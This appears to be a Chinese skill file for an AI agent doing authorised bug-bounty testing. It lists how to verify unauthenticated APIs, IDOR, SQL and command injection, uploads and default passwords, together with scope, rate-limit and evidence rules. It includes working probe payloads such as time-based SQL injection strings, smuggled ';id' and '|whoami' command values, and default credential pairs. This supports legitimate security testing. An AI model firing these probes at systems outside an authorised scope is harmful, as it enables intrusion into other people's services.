---
name: high-value-vulns
description: 高价值漏洞挖掘清单：未授权接口、越权(IDOR)、SQL/命令注入、文件上传、默认口令、含凭据数据泄露的验证套路与证据要求。用于 SRC 众测/授权渗透，目标是把"配置类低价值发现"升级成"能过审换钱的实质漏洞"。
license: MIT
compatibility: 仅限 SRC 平台授权范围 / 授权渗透测试；只读验证，禁止破坏性操作
---

# 高价值漏洞挖掘（能换钱的那种）

> 配置类（缺安全头/SPF/TLS/无密钥源码泄露）补天基本驳回。**只有"能读到真实数据/能执行操作"的才给钱。**

## 0. 前置纪律

- 只在授权范围（scope）内；越界立即停
- 只读验证：GET/HEAD 为主，禁止写入/删除/爆破/上传 webshell
- 限速 ≤10 请求/秒；单参数试探 ≤5 次
- 发现真实用户数据：立即停止，只读取证（截图/响应片段），不下载不传播
- 所有请求带浏览器 UA（很多站 WAF 拦默认 UA）：
  `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36`

## 1. 找出候选接口（从已有侦察成果里挑）

```bash
# 从 source map / JS 里提取 API 端点
grep -aoE '"/[a-zA-Z0-9_/\-]{3,}"' app.js.map | sort -u | head -100
# 从爬虫/历史 URL 里找参数
grep -E '\?' gau.txt crawl.txt | sort -u | head -100
# 从 httpx 结果里找 API 类子域
grep -iE 'api|gateway|gw|svc|backend|admin|manage' httpx.txt
```

产出：**接口清单**（URL、方法、参数、是否需登录）

## 2. 六大高价值类型验证

### ① 未授权访问（最高优先，最容易换钱）

```bash
# 不带任何 Cookie/Authorization 请求接口
curl -s -o resp.txt -w '%{http_code} %{size_download}' -A "$UA" "https://api.example.com/user/info"
# 判断：HTTP 200 且响应含真实数据（用户名/手机号/订单号/配置）→ 成立
# 对照组：其他接口返回"未登录/401"→ 证明是单个接口漏鉴权（这步能显著提高过审率）
```

### ② 越权 / IDOR

```bash
# 水平越权：用 A 账号的 token 访问 B 的资源 ID
curl -A "$UA" -H "Cookie: <A账号cookie>" "https://example.com/order/detail?id=1002"
# B 账号的资源 1002 能读到 → 水平越权成立
# 垂直越权：普通账号访问管理员接口
curl -A "$UA" -H "Cookie: <普通账号>" "https://example.com/admin/user/list"
```

### ③ SQL 注入（最小化验证）

```bash
# 单引号探测：对比报错/行为差异
curl -A "$UA" "https://example.com/item?id=1'"
curl -A "$UA" "https://example.com/item?id=1'-- -"
# 时间盲注（仅当其他手段不明确时）
curl -A "$UA" "https://example.com/item?id=1' AND SLEEP(3)-- -"
# 成立标准：报错回显 / 布尔差异 / 时间差 3 秒以上（需重复 2 次确认）
```

### ④ 命令注入

```bash
# 参数点试探（分号/管道/反引号），用无害命令
curl -A "$UA" "https://example.com/ping?host=127.0.0.1;id"
curl -A "$UA" "https://example.com/ping?host=127.0.0.1|whoami"
# 成立标准：响应里出现命令输出（uid=.../用户名）
```

### ⑤ 文件上传

```bash
# 找上传点 → 传合法文件（.jpg/.txt）→ 看是否回显可访问路径
# 只验证"能上传并访问"，不传 webshell（授权范围内也建议不传）
```

### ⑥ 默认口令 / 后台暴露

```bash
# 常见后台路径
for p in admin login manage backend console; do curl -s -o /dev/null -w "%{http_code} /$p\n" -A "$UA" "https://example.com/$p"; done
# 弱口令：admin/admin, admin/123456, test/test（仅有限尝试，禁爆破）
```

### ⑦ 敏感数据泄露（要含真实凭据）

```bash
# 配置文件/备份/日志（必须打开验证内容含密钥/密码/连接串才算）
# 判断：含 secret/key/password/token 且有实际值
```

## 3. 误报排除（必做）

| 现象 | 是否成立 |
|---|---|
| HTTP 200 但返回空/错误页/HTML 登录页 | ❌ 不算 |
| 返回 "code:2001 未登录" | ❌ 不算（这是正常拦截） |
| 接口返回数据但是公开信息（邮编/客服电话） | ❌ 不算 |
| source map 无密钥/无源码敏感内容 | ❌ 低价值，别报 |
| 缺安全头/SPF/TLS/证书过期 | ❌ 配置类，补天多驳回 |
| 越权读到了**别人**的数据 | ✅ 成立 |
| 未授权接口返回**真实用户/业务数据** | ✅ 成立 |
| 上传后可**公网访问**已传文件 | ✅ 成立 |

## 4. 证据要求（补天要的）

```
每条漏洞：
1. 原始请求（curl 完整命令或 HTTP 报文）
2. 原始响应（状态码 + 关键字段，脱敏）
3. 复现步骤 3-5 步（第三方照做能复现）
4. 影响证明（读到了什么真实数据/能做什么操作）
5. 截图（含时间与 URL）
6. 修复建议（具体到接口/配置）
```

## 5. 补天等级与过审要点

| 类型 | 常见等级 | 过审关键 |
|---|---|---|
| 未授权接口返回数据 | 中危 | 证明数据真实 + 对照接口正常拦截 |
| 未授权接口签发凭证（如上传签名） | 中危 | 解码证明凭证有效 + 影响描述 |
| 水平/垂直越权 | 中-高危 | 双账号对比截图 |
| SQL/命令注入 | 中-高危 | 报错/时间差可重复 |
| 上传可访问 | 中危 | 上传后公网可访问 |
| 默认口令进后台 | 高危 | 登录成功截图 |

## 6. 产出模板

```markdown
## 可提交漏洞清单
| # | 资产 | 类型 | 等级 | 复现要点 | 证据路径 | 价值判断 |
|---|------|------|------|---------|---------|---------|
```

**只列有真实数据影响的；配置类不列。**
